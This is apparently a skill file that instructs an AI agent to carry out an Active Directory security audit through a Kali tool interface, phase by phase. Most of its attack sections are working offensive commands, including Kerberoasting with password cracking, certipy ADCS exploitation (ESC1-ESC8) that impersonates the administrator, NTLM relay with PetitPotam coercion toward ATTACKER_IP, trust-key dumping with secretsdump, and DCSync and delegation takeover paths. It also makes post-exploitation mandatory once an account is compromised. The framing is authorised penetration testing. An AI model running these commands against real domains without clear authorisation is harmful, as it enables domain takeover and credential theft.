---
name: ad-assessment
description: |
  Active Directory security audit using the MITRE ATT&CK framework. Full domain enumeration, trust mapping, GPO analysis, ACL abuse paths, ADCS attacks (ESC1-ESC8), delegation abuse (constrained/unconstrained/RBCD), fine-grained password policies, LAPS deployment, service account security, and Kerberos configuration.

  Uses enum4linux-ng, netexec, impacket, ldapsearch, certipy-ad, bloodhound-python, and rpcclient. Produces attack path diagrams, prioritized risk register, and PoCs. Chains into /gh-export for issue filing.
argument-hint: <dc-ip-or-domain> [domain=DOMAIN] [user=USER] [pass=PASS] [depth=quick|standard|thorough]
user-invocable: true
---

# Active Directory Security Audit

You are an expert Active Directory security assessor. Your goal: comprehensively audit the AD environment for misconfigurations, dangerous permissions, certificate service vulnerabilities, delegation abuse, and privilege escalation paths. Produce a prioritized risk register with attack path diagrams.

**Request:** $ARGUMENTS

---

## CHAIN COMMITMENTS — DECLARE BEFORE STARTING

Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.

| Trigger | Chain | Mandatory? | Claude Code | opencode |
|---------|-------|-----------|-------------|---------|
| After `session(action="complete")` | `/gh-export` | OPTIONAL — user request only | `Skill(skill="gh-export")` | `cat ~/.config/opencode/commands/gh-export.md` |
| Account compromise achieved / shell access | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
| Hashes / credentials harvested | `/credential-audit` | OPTIONAL | `Skill(skill="credential-audit")` | `cat ~/.config/opencode/commands/credential-audit.md` |
| Lateral movement opportunities found | `/lateral-movement` | OPTIONAL | `Skill(skill="lateral-movement")` | `cat ~/.config/opencode/commands/lateral-movement.md` |
| Architecture review needed | `/threat-modeling` | OPTIONAL | `Skill(skill="threat-modeling")` | `cat ~/.config/opencode/commands/threat-modeling.md` |


## Tools Available

| Tool | Use for |
|------|---------|
| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
| `session(action="complete", options={...})` | Mark the scan done and write final notes |
| `kali(command=...)` | Kali tools: enum4linux-ng, netexec/nxc, impacket-*, ldapsearch, rpcclient, certipy-ad, bloodhound-python |
| `scan(tool="nmap", ...)` | DC service discovery |
| `http(action="request", ...)` | Raw HTTP — ADCS web enrollment probing, etc. Set `poc=True` for confirmed exploits |
| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
| `report(action="diagram", data={...})` | Save a Mermaid diagram (AD topology, attack paths) to findings.json |
| `report(action="dashboard", data={"port": 7777})` | Serve dashboard.html at localhost:7777 |
| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |


**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.

---

## Depth Presets

| Depth | What runs | Default limits |
|-------|-----------|----------------|
| `quick` | Domain enum + password policy + privileged groups + Kerberoasting + AS-REP | $0.10 | 15 min | 10 calls |
| `standard` | Quick + ADCS (ESC1-ESC8) + delegation + GPO + ACL + FGPP + LAPS + service accounts | $0.50 | 45 min | 25 calls |
| `thorough` | Standard + BloodHound + forest trust analysis + attack path prioritization | unlimited | unlimited | unlimited |

---

## Workflow

### Phase 0 — Scope & Setup

0. Call `session(action="start", options={...})` with DC IP, depth, and limits
1. Call `report(action="dashboard", data={"port": 7777})` — live findings tracker
2. Call `report(action="note", data={...})` — record domain, DC IP, credentials, assessment objectives

---

### Phase 1 — Domain Enumeration & Functional Level

```
kali(command="enum4linux-ng -A DC_IP -u 'USER' -p 'PASSWORD' 2>/dev/null | head -200")
kali(command="nxc smb DC_IP -u USER -p 'PASSWORD' --pass-pol 2>/dev/null")
kali(command="nxc smb DC_IP -u USER -p 'PASSWORD' --users 2>/dev/null | head -50")
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)' sAMAccountName 2>/dev/null")
```

**Domain functional level** — query `msDS-Behavior-Version` on the domain object:
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(objectClass=domain)' msDS-Behavior-Version 2>/dev/null")
```

| Value | Level | Impact on attacks |
|-------|-------|-------------------|
| 3 | 2008 | No Protected Users, no gMSA. RC4 default — Kerberoast hashes crack fast |
| 4 | 2008 R2 | MSA available but no gMSA. Still no Protected Users |
| 5 | 2012 | gMSA + claims available. Still no Protected Users |
| 6 | 2012 R2 | **Protected Users group available** — AES-only Kerberos, no NTLM, no delegation, no cred caching. Auth Policies/Silos available |
| 7 | 2016 | PAM trust support, key trust for cert-less auth |
| 8-9 | 2019-2022 | No major new AD security features |

**Key checks:** Level < 6 means Protected Users unavailable. Level < 5 means no gMSA (all service accounts have static passwords). Level 3 means RC4 default. If level >= 6, check if Protected Users is actually populated:
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=Protected Users,CN=Users,DC=domain,DC=com' member 2>/dev/null")
```

**Machine Account Quota** (RBCD prerequisite):
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(objectClass=domain)' ms-DS-MachineAccountQuota 2>/dev/null")
```

Call `report(action="diagram", data={...})` with AD topology after this phase.

---

### Phase 2 — Kerberos Attacks

**Kerberoasting:**
```
kali(command="impacket-GetUserSPNs DOMAIN/USER:'PASSWORD' -dc-ip DC_IP -request -outputfile /tmp/kerberoast.txt")
```
Analyze output: account name, password last set (old = likely weak), admin count, encryption type (RC4/type 23 cracks far faster than AES/type 17-18), delegation flags.

```
kali(command="john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast.txt")
```

**AS-REP Roasting:**
```
kali(command="impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile /tmp/domain-users.txt -format john -outputfile /tmp/asrep.txt -no-pass 2>/dev/null")
```

---

### Phase 3 — Service Account Security (standard+)

```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName pwdLastSet adminCount memberOf msDS-AllowedToDelegateTo userAccountControl 2>/dev/null")
```

**Assess each service account:** password age (`pwdLastSet` — > 2 years = high risk), admin membership (`adminCount=1` + Kerberoastable = critical), delegation (`msDS-AllowedToDelegateTo` — chained with cracked password gives impersonation), UAC flags (`DONT_EXPIRE_PASSWORD` 0x10000 — never rotated).

**Detect gMSA accounts:**
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(objectClass=msDS-GroupManagedServiceAccount)' sAMAccountName msDS-GroupMSAMembership msDS-ManagedPasswordInterval 2>/dev/null")
```

gMSA passwords auto-rotate (default 30 days), 240+ bytes — uncrackable. The key question: who can read the password? `msDS-GroupMSAMembership` is a binary security descriptor listing authorized principals. If a compromised account is listed:
```
kali(command="nxc ldap DC_IP -u USER -p 'PASSWORD' --gmsa 2>/dev/null")
```

Report if: service accounts with SPNs use static passwords (not gMSA), have `DONT_EXPIRE_PASSWORD`, or are in privileged groups.

---

### Phase 4 — ADCS Assessment: ESC1-ESC8 (standard+)

```
kali(command="certipy find -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout 2>/dev/null | head -300")
```

#### ESC1 — SAN + Enrollment + Client Auth EKU
Template allows `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, low-priv enrollment, Client Authentication EKU.
```
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'administrator@DOMAIN' -dc-ip DC_IP")
kali(command="certipy auth -pfx administrator.pfx -dc-ip DC_IP")
```
Expected: `Got hash for 'administrator@DOMAIN': aad3b435b51404eeaad3b435b51404ee:...`

#### ESC2 — Any Purpose or SubCA EKU
Template has `Any Purpose` EKU (OID 2.5.29.37.0) or `SubCA` — can be used for client auth regardless.
```
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'VULN-TEMPLATE' -dc-ip DC_IP")
kali(command="certipy auth -pfx user.pfx -dc-ip DC_IP")
```

#### ESC3 — Enrollment Agent Abuse
Template 1 has Certificate Request Agent EKU + low-priv enrollment. Template 2 allows enrollment on behalf of others + Client Auth EKU.
```
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'AGENT-TEMPLATE' -dc-ip DC_IP")
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'TARGET-TEMPLATE' -on-behalf-of 'DOMAIN\\administrator' -pfx user.pfx -dc-ip DC_IP")
kali(command="certipy auth -pfx administrator.pfx -dc-ip DC_IP")
```

#### ESC4 — Template ACL Modification + Enrollment
Low-priv user has WriteDACL/WriteOwner/WriteProperty on a template. Modify it to enable ESC1, exploit, then restore.
```
kali(command="certipy template -u USER@DOMAIN -p 'PASSWORD' -template 'VULN-TEMPLATE' -save-old -dc-ip DC_IP")
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'administrator@DOMAIN' -dc-ip DC_IP")
kali(command="certipy template -u USER@DOMAIN -p 'PASSWORD' -template 'VULN-TEMPLATE' -configuration VULN-TEMPLATE.json -dc-ip DC_IP")
```

#### ESC5 — CA Server ACL
Low-priv user has write access to the CA AD object. Can modify CA config to create ESC6/ESC7 conditions.
```
kali(command="certipy find -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP -stdout 2>/dev/null | grep -A 20 'CA Name'")
```

#### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
CA flag allows ANY requestor to specify SAN in ANY certificate request, regardless of template settings.
```
kali(command="certipy find -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP -stdout 2>/dev/null | grep -i 'EDITF_ATTRIBUTESUBJECTALTNAME2'")
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'User' -upn 'administrator@DOMAIN' -dc-ip DC_IP")
```

#### ESC7 — ManageCA + ManageCertificates
User has `ManageCA` — can add self as officer, enable SubCA template, request cert (denied), approve own request, retrieve.
```
kali(command="certipy ca -ca 'CA-NAME' -add-officer USER -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP")
kali(command="certipy ca -ca 'CA-NAME' -enable-template 'SubCA' -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP")
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -template 'SubCA' -upn 'administrator@DOMAIN' -dc-ip DC_IP")
kali(command="certipy ca -ca 'CA-NAME' -issue-request REQUEST_ID -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP")
kali(command="certipy req -u USER@DOMAIN -p 'PASSWORD' -ca 'CA-NAME' -retrieve REQUEST_ID -dc-ip DC_IP")
```

#### ESC8 — NTLM Relay to HTTP Enrollment
CA has HTTP enrollment endpoint, accepts NTLM, no EPA enforced. Relay coerced DC auth to get DC certificate.
```
kali(command="curl -sk https://CA_IP/certsrv/ -o /dev/null -w '%{http_code}' 2>/dev/null")
kali(command="impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController' --no-http-server")
kali(command="python3 /opt/PetitPotam/PetitPotam.py ATTACKER_IP DC_IP")
```

**Note:** ESC4 and ESC7 are destructive — they modify templates/CA config. Always restore original state after testing.

---

### Phase 5 — Delegation Analysis (standard+)

```
kali(command="impacket-findDelegation DOMAIN/USER:'PASSWORD' -dc-ip DC_IP")
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName 2>/dev/null")
```

| Type | Risk | Attack |
|------|------|--------|
| Unconstrained (UAC 0x80000) | **Critical** | Capture TGTs from connecting users. Combine with PetitPotam to coerce DC auth |
| Constrained (msDS-AllowedToDelegateTo) | **High** | S4U2Self + S4U2Proxy impersonation to allowed services |
| RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) | **High** | Control a computer account → set RBCD on target → impersonate any user |

If `ms-DS-MachineAccountQuota > 0` (default 10), any authenticated user can create machine accounts for RBCD.

---

### Phase 6 — Fine-Grained Password Policies (standard+)

```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=Password Settings Container,CN=System,DC=domain,DC=com' '(objectClass=msDS-PasswordSettings)' cn msDS-PasswordSettingsPrecedence msDS-MinimumPasswordLength msDS-PasswordComplexityEnabled msDS-LockoutThreshold msDS-MaximumPasswordAge msDS-PSOAppliesTo 2>/dev/null")
```

**Key attributes:** `msDS-PasswordSettingsPrecedence` (lower = higher priority), `msDS-MinimumPasswordLength`, `msDS-PasswordComplexityEnabled` (FALSE = simple passwords), `msDS-LockoutThreshold` (0 = no lockout = unlimited brute-force), `msDS-PSOAppliesTo` (DNs of users/groups).

**Precedence rules:** FGPP on user beats FGPP on group. Among group FGPPs, lowest precedence value wins. No FGPP = Default Domain Policy applies.

Report if: any FGPP is weaker than domain policy, service account groups have relaxed policies, privileged groups have no FGPP, or `msDS-LockoutThreshold=0`.

---

### Phase 7 — LAPS Deployment & Bypass (standard+)

**Detect LAPS v1 and v2 schema extensions:**
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=Schema,CN=Configuration,DC=domain,DC=com' '(|(cn=ms-Mcs-AdmPwd)(cn=msLAPS-Password))' cn 2>/dev/null")
```

**Try reading LAPS passwords (tests current user's read rights):**
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(ms-Mcs-AdmPwd=*)' sAMAccountName ms-Mcs-AdmPwd 2>/dev/null | head -50")
kali(command="nxc ldap DC_IP -u USER -p 'PASSWORD' --module laps 2>/dev/null")
```

If passwords are returned, call `report(action="finding", data={...})` immediately (critical — current user has LAPS read rights).

**Count computers without LAPS (static local admin passwords):**
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(&(objectClass=computer)(!(ms-Mcs-AdmPwd=*)))' sAMAccountName 2>/dev/null | grep sAMAccountName | wc -l")
```

Report if: LAPS not deployed, significant computers lack LAPS, current user reads passwords outside scope, or only LAPS v1 (v2 adds encryption at rest + password history).

---

### Phase 8 — GPO Security Deep-Dive (standard+)

```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath 2>/dev/null | head -60")
```

**GPO permission analysis:**
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=Group Policy Creator Owners,CN=Users,DC=domain,DC=com' member 2>/dev/null")
```

**GPO link analysis** — `gPOptions=1` = Block Inheritance, `gPLink` suffix `;2` = Enforced:
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(gPLink=*)' distinguishedName gPLink gPOptions 2>/dev/null | head -60")
```

**Applied order:** Local → Site → Domain → OU (parent first, child last). Enforced GPOs override Block Inheritance.

**Security-critical GPO settings:** logon scripts (`Machine\Scripts\` — run as SYSTEM), restricted groups (add users to local Admins), scheduled tasks (immediate = instant code exec), software installation (deploy MSI domain-wide), GPP passwords (`cpassword` — trivially decryptable via MS14-025).

**Check for GPP passwords:**
```
kali(command="nxc smb DC_IP -u USER -p 'PASSWORD' -M gpp_password 2>/dev/null")
```

**Inspect SYSVOL for security-critical settings:**
```
kali(command="smbclient //DC_IP/SYSVOL -U 'DOMAIN\\USER%PASSWORD' -c 'recurse; prompt; ls' 2>/dev/null | grep -E '(Scripts|ScheduledTasks|Groups|Registry)' | head -30")
```

Look for: `Scripts\scripts.ini` (logon/logoff scripts), `Preferences\ScheduledTasks\ScheduledTasks.xml` (scheduled tasks including immediate tasks), `Preferences\Groups\Groups.xml` (restricted groups / local admin membership), `Preferences\Registry\Registry.xml` (registry modifications that may disable security features).

**GPO abuse** — if you have write access to a GPO linked to targets, you can deploy an immediate scheduled task for code execution as SYSTEM on every machine where the GPO applies. This is one of the most reliable lateral movement techniques in AD.

---

### Phase 9 — ACL Parsing & GUID Decoding (standard+)

**Practical ACL enumeration:**
```
kali(command="impacket-dacledit DOMAIN/USER:'PASSWORD' -dc-ip DC_IP -target-dn 'DC=domain,DC=com' -action read 2>/dev/null | head -60")
kali(command="nxc ldap DC_IP -u USER -p 'PASSWORD' --dacl 'CN=Domain Admins,CN=Users,DC=domain,DC=com' 2>/dev/null | head -40")
```

**AdminSDHolder ACL** (propagates to all protected objects within 60 minutes):
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' nTSecurityDescriptor -E '!1.2.840.113556.1.4.801=::MAMCAQc=' 2>/dev/null | head -50")
```

**ObjectType GUID reference** — ACEs reference rights by GUID:

| GUID | Right |
|------|-------|
| `00000000-0000-0000-0000-000000000000` | All rights (GenericAll) |
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes (DCSync 1/2) |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All (DCSync 2/2) |
| `00299570-246d-11d0-a768-00aa006e0529` | User-Force-Change-Password |
| `bf9679c0-0de6-11d0-a285-00aa003049e2` | Member (group membership write) |
| `f3a64788-5306-11d1-a9c5-0000f80367c1` | Self-Membership (add self to group) |
| `0e10c968-78fb-11d2-90d4-00c04f79dc55` | Certificate-Enrollment |
| `a05b8cc2-17bc-4802-a710-e7c15ab866a2` | Certificate-AutoEnrollment |
| `ab721a53-1e2f-11d0-9819-00aa0040529b` | User-Change-Password |
| `5b47d60f-6090-40b2-9f37-2a4de88f3063` | msDS-KeyCredentialLink (Shadow Credentials) |

**Dangerous ACL combinations:**

| Permission | On Object | Risk |
|-----------|-----------|------|
| GenericAll / WriteDACL | Domain object | **Critical** — DCSync, domain takeover |
| WriteOwner | Domain Admins group | **Critical** — take ownership, modify membership |
| DS-Replication-Get-Changes + All | Domain object (non-admin) | **Critical** — DCSync |
| WriteDACL | AdminSDHolder | **Critical** — propagates to all protected objects |
| GenericWrite | User object | **High** — set SPN (targeted Kerberoasting), modify logon script |
| ForceChangePassword | Admin user | **High** — reset password without knowing current |
| AddMember | Privileged group | **High** — add self to Domain Admins |
| GenericAll | GPO object | **High** — deploy malicious scripts |

**LAPS read rights** and **gMSA password read rights** — check if unexpected principals can read these:
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(objectClass=msDS-GroupManagedServiceAccount)' msDS-GroupMSAMembership 2>/dev/null")
```

---

### Phase 10 — BloodHound Collection & Analysis (thorough)

```
kali(command="bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -dc DC_IP -c All --zip -o /tmp/bloodhound 2>/dev/null")
```

**Key queries after collection:**

| Query | Finds | Priority |
|-------|-------|----------|
| Shortest Path to DA | Most direct privilege escalation from any owned user | **Critical** |
| Owned Principals to DA | Attack paths from already-compromised accounts | **Critical** |
| Kerberoastable Users with Path to DA | Service accounts whose cracked passwords lead to DA | **High** |
| Users with DCSync Rights | Non-default principals with replication permissions | **Critical** |
| Unconstrained Delegation Computers | Hosts caching TGTs from all authenticating users | **High** |
| GPO Creators/Editors | Users who can create or modify Group Policy | **Medium** |

**Interpreting common BloodHound edges:**

| Edge | Meaning | Exploitation |
|------|---------|-------------|
| `GenericAll` on user | Full control over the user object | Reset password, set SPN for Kerberoasting, modify attributes |
| `GenericWrite` on user | Write any non-protected attribute | Set SPN (targeted Kerberoast), modify logon script, set msDS-KeyCredentialLink (Shadow Credentials) |
| `ForceChangePassword` | Reset password without knowing current | Immediate account takeover — no audit trail of old password |
| `AddMember` on group | Add any principal to the group | Direct privilege escalation if targeting privileged group |
| `WriteDACL` | Modify the object's DACL | Grant self GenericAll, then full control — two-step takeover |
| `Owns` | Object owner | Equivalent to WriteDACL — owner can always modify permissions |
| `AllowedToDelegate` | Constrained delegation configured | S4U2Proxy impersonation to the allowed SPN |
| `AllowedToAct` | RBCD configured on target | Impersonate any user to this computer if you control the allowed principal |
| `HasSession` | User has active logon session | Credential theft via memory dump (Mimikatz, lsassy) |
| `CanRDP` / `CanPSRemote` | Remote access permitted | Lateral movement — RDP or WinRM/PSRemote |
| `SQLAdmin` | SA access to SQL Server | OS command execution via xp_cmdshell |
| `ReadLAPSPassword` | Can read LAPS attribute | Retrieve local admin password for the computer |
| `ReadGMSAPassword` | Can read gMSA password | Retrieve managed service account credential |

**Attack path chaining example:** Owned user → GenericWrite on svc_sql → Set SPN → Kerberoast → Crack → svc_sql HasSession on SQLSRV01 → Credential dump → Server Admin → AllowedToDelegate to DC CIFS → S4U2Proxy → DCSync → DA.

Call `report(action="diagram", data={...})` with every discovered attack chain. Multi-hop paths are more valuable than individual findings.

---

### Phase 11 — Forest Trust Deep Analysis (thorough)

```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=System,DC=domain,DC=com' '(objectClass=trustedDomain)' trustPartner trustDirection trustType trustAttributes flatName securityIdentifier 2>/dev/null")
```

**trustDirection:** 1=Inbound (they trust us), 2=Outbound (we trust them), 3=Bidirectional.
**trustType:** 1=Downlevel (NT), 2=Uplevel (AD), 3=MIT Kerberos, 4=DCE.

**trustAttributes — critical security flags:**

| Bit | Meaning | Implication |
|-----|---------|-------------|
| 0x04 | SID filtering enabled | **Good** — prevents SID history injection |
| 0x08 | Forest trust | Trust between forest roots |
| 0x20 | Intra-forest (parent-child) | SID filtering OFF by default — SID history attacks work |
| 0x40 | Selective authentication | **Good** — only explicitly permitted users can authenticate |

**Key checks:** Intra-forest trusts have no SID filtering — child domain compromise = forest compromise via SID history injection. External trusts should have SID filtering ON (0x04). Selective auth should be enabled on external/forest trusts (without it, any trusted user authenticates to any resource).

```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'CN=System,DC=domain,DC=com' '(&(objectClass=trustedDomain)(trustAttributes:1.2.840.113556.1.4.803:=64))' trustPartner 2>/dev/null")
```

**Enumerate trust accounts:**
```
kali(command="ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASSWORD' -b 'DC=domain,DC=com' '(userAccountControl:1.2.840.113556.1.4.803:=2048)' sAMAccountName 2>/dev/null")
```

**Trust key extraction** (for inter-realm TGT forging — requires DA or DCSync):
```
kali(command="impacket-secretsdump DOMAIN/USER:'PASSWORD'@DC_IP -just-dc-user 'TRUSTED_DOMAIN$' 2>/dev/null")
```
The trust key (RC4/AES) enables forging inter-realm TGTs with `impacket-ticketer`. Combined with SID history injection on intra-forest trusts, this allows escalation from child domain DA to forest root DA.

---

### Phase 12 — Attack Path Prioritization

**P0 — Immediate domain compromise:**

| Condition | Attack |
|-----------|--------|
| ADCS ESC1/ESC6/ESC8 vulnerable | Certificate abuse for instant DA |
| Non-admin has DCSync rights | Dump all domain hashes |
| Unconstrained delegation on non-DC | Coerce DC auth + capture TGT |
| GPP passwords in SYSVOL | Decrypt cpassword for instant creds |

**P1 — High-probability escalation:**

| Condition | Attack |
|-----------|--------|
| Kerberoastable accounts with DA path | Crack hash → escalate |
| MachineAccountQuota > 0 + WriteDACL on computer | RBCD attack |
| GenericAll/WriteDACL on privileged group | Modify membership or grant DCSync |
| Constrained delegation to DC services | S4U2Proxy impersonation |
| ADCS ESC4 (template ACL) | Modify template → ESC1 |

**P2 — Additional steps required:**

| Condition | Attack |
|-----------|--------|
| AS-REP Roastable accounts | Crack offline (may not have admin path) |
| LAPS not deployed | Static local admin → lateral movement |
| Weak FGPP on service accounts | Password spray |
| SID filtering disabled on external trust | SID history injection (requires partner compromise) |

**P3 — Defense-in-depth gaps:** Protected Users empty, functional level < 2012 R2, no FGPP for admins, LAPS v1 only.

```
report(action="note", data={"message": "Attack Path Priority Assessment:
  P0 (immediate DA):     [list or 'none']
  P1 (high-probability): [list or 'none']
  P2 (additional steps): [list or 'none']
  P3 (defense gaps):     [list or 'none']
  Recommended chain: [most likely path from current access to DA]")
```

---

### Phase 13 — Report & Wrap-Up

1. Call `report(action="diagram", data={...})` with attack path map showing how findings chain to DA
2. Call `report(action="note", data={...})` with full assessment summary (domain, functional level, DCs, users, admins, Protected Users, service accounts, password policy, FGPP, LAPS, Kerberoasting, AS-REP, ADCS ESCs, delegation, ACLs, GPOs, trusts, shortest path to DA, priority assessment)
3. Call `session(action="complete", options={...})` with summary

---

## Chaining Other Skills

| Skill | When to invoke |
|-------|----------------|
| `/pentester` | DC or member server has web services |
| `/analyze-cve` | CVE-affected component (Exchange, ADFS, print spooler) |
| `/threat-modeling` | After assessment — STRIDE analysis of the AD architecture |
| `/gh-export` | When user asks to file GitHub issues|

---

## Finding Severity Guide

| Severity | Criteria | Examples |
|----------|----------|---------|
| **Critical** | Direct path to DA, full domain compromise | ESC1/ESC6/ESC8, DCSync rights on non-admin, unconstrained delegation, GPP passwords |
| **High** | Privilege escalation requiring one step | Kerberoastable admin, RBCD prerequisites, constrained delegation to DC, writable GPO on DCs |
| **Medium** | Exploitable with specific conditions | AS-REP Roastable, GenericWrite on users, weak FGPP, partial LAPS gaps |
| **Low** | Defense-in-depth gap | Protected Users empty, outdated functional level, LAPS v1 only, no admin FGPP |

---

## Rules

- **`session(action="start", options={...})` is mandatory** — never run any other tool before it
- **Batch independent tools in the same response** — they execute in parallel
- When any tool returns a LIMIT message, stop immediately and call `session(action="complete", options={...})`
- **Enumerate first, attack second** — understand AD structure before exploiting
- **Always check ADCS** — certificate services are the most common enterprise attack vector
- **Follow the priority decision tree** — ADCS present? ESC checks first. SPNs? Kerberoast. MAQ > 0? RBCD
- **Call `report(action="finding", data={...})` for every confirmed weakness** — include raw tool output as evidence
- **Call `report(action="diagram", data={...})` twice**: after Phase 1 (topology) and at the end (attack paths)
- **ADCS exploitation is destructive** — ESC4 modifies templates, ESC7 modifies CA config. Always restore
- **Use `report(action="note", data={...})` liberally** — document structure, trust analysis, ACL reasoning, attack path logic
- **Never fabricate findings** — only report what tool output confirms
- **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used
